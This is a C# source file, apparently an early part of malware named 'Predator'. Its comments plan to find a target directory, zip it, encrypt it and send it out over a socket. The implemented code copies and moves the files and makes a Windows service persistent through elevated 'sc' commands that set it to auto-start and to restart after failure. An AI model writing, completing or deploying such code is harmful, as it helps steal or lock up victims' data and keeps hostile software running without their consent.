using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Predator.Components
{
    internal class ServiceWork
    {
        public void InitService() {
        
            //Primero hay que escanear hasta encontrar el directorio
            FilesManager fm = new FilesManager();
            string pathDirectory = fm.SearchDirectory();
            fm.MoveToRoute(pathDirectory, "C:\\Users\\theen\\Desktop");

            //Luego cuando lo encuentre, hay que empezar a mover el directorio al ZIP
            string pathTempZip = fm.CopyToZip(pathDirectory);
            fm.MoveToRoute(pathTempZip, "C:\\Users\\theen\\Desktop");

            //Luego, vamos a encriptar la carpeta

            //Luego pasar el directorio al SOCKET
        }

        public void RestoreInit() { }

        public void SetServiceStartModeToAutomatic(string serviceName)
        {
            var process = new Process();
            process.StartInfo.FileName = "sc";
            process.StartInfo.Arguments = $"config {serviceName} start= auto";
            process.StartInfo.Verb = "runas"; // Ejecutar como administrador
            process.Start();
         
        }

        public void SetServiceRecoveryActionToRestart(string serviceName)
        {
            var process = new Process();
            process.StartInfo.FileName = "sc";
            process.StartInfo.Arguments = $"failure {serviceName} reset= 60 actions= restart/60000";
            process.StartInfo.Verb = "runas"; // Ejecutar como administrador
            process.Start();
        }
    }
}
